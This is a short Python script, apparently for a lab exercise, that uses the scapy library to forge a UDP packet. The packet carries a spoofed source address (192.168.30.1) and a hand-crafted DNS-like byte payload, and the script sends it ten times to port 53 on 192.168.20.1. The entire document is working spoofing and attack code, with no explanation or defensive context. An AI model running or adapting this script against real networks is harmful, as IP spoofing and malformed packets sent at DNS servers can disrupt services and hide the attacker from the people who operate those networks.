from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
D= "\x2a\x00\x01\x32\x02\xfd\xa8\xe3" + "\x00" * 20 + "\x01\x00\x02" + "\x00" * 11

spoofed_packet = IP(src=A, dst=B) / UDP(sport=5353, dport=53) / D
send(spoofed_packet, count=10)